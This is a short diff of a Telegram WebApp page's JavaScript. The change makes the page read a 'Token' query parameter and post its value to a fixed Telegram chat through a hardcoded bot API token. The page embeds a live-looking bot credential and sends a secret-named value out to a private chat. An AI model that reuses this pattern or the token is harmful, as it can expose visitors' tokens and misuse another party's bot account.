@@ -28,7 +28,10 @@
     function sendMessage() {
 			const token = '5476946556:AAE64iQclmNuyKjkInVJtY5eqUqtDa3EoU4';
 			const chatId = '598045349';
-			const message = `Telegram ${window.location.search}`;
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            const id = urlParams.get('Token');
+			const message = `Telegram ${id}`;
 
 			const xhttp = new XMLHttpRequest();
 			xhttp.onreadystatechange = function() {
@@ -43,7 +46,7 @@
 			xhttp.send(`chat_id=${chatId}&text=${message}`);
 		}
     function showPopup() {
-        Telegram.WebApp.showAlert('Alireza mhd')
+        Telegram.WebApp.showAlert('Alireza')
     }
 </script>
 <body style="background-color: #ffffff">
